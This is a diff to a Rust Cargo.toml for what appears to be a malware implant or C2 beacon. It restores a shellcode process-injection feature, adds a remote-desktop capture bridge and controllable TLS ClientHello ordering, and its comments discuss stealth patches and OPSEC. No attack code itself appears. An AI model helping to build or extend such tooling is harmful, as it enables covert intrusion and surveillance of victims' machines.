@@ -15,7 +15,13 @@ default = ["ws", "standard"]
 
 # --- Transports (Builder picks one) ---
 ws = ["dep:tokio-tungstenite", "dep:url"]
-ws-tls = ["ws", "tokio-tungstenite/rustls-tls-native-roots"]
+# WSS with controllable ClientHello cipher order (rustls; not SChannel)
+ws-tls = [
+    "ws",
+    "tokio-tungstenite/rustls-tls-native-roots",
+    "dep:rustls",
+    "dep:rustls-native-certs",
+]
 tcp = []
 tcp_bind = []
 dns = ["dep:trust-dns-resolver"]
@@ -27,7 +33,7 @@ dns = ["dep:trust-dns-resolver"]
 #   NOT built-in: socks / plugin / bof / dotnet (module or forward/standard)
 # Web UI PTY uses Yamux stream 0x01 → requires `pty`.
 minimal = ["post-ex", "pty", "encoding-support", "module-loader", "isolated-exec", "mem-map"]
-# standard: FORWARD / full post-ex monolith — process injection permanently removed
+# standard: FORWARD / full post-ex monolith — Stage0 still has NO inject (L2 only)
 standard = ["post-ex", "pty", "socks", "plugin", "bof", "dotnet", "encoding-support", "logging", "rt-multi", "module-loader", "isolated-exec", "mem-map"]
 # full: standard + high-signature stealth patches
 full = ["standard", "stealth-adv"]
@@ -48,7 +54,8 @@ isolated-exec = []
 pty = []
 socks = []
 plugin = ["dep:lazy_static"]
-# inject feature deleted — no process injection builds
+# inject: remote process shellcode — ONLY for L2 mod_inject crate, never Stage0 default
+inject = []
 bof = ["dep:lazy_static"]
 dotnet = []
 encoding-support = ["dep:encoding_rs"]
@@ -59,6 +66,10 @@ rt-multi = ["tokio/rt-multi-thread"]
 stealth-adv = ["dep:lazy_static"]
 sleep-mask = []
 
+# Remote desktop Yamux 0x0D bridge — OPSEC hard line: NEVER in default/standard/beacon/full.
+# Opt-in only via custom / full-gui style feature sets. Capture lives in L2 mod_desktop.
+desktop = []
+
 [dependencies]
 # Single-thread runtime by default (smaller); standard enables rt-multi-thread
 tokio = { version = "1.35", default-features = false, features = ["rt", "macros", "io-util", "net", "time", "sync", "process"] }
@@ -67,6 +78,9 @@ tokio-util = { version = "0.7", default-features = false, features = ["codec", "
 yamux = "0.10"
 url = { version = "2.5", optional = true }
 trust-dns-resolver = { version = "0.23", optional = true }
+# Match tokio-tungstenite 0.21 → rustls 0.22 ClientConfig
+rustls = { version = "0.22", optional = true, default-features = false, features = ["ring", "tls12", "logging"] }
+rustls-native-certs = { version = "0.7", optional = true }
 serde = { version = "1.0", default-features = false, features = ["derive", "std"] }
 serde_json = { version = "1.0", default-features = false, features = ["std"] }
 uuid = { version = "1.6", default-features = false }
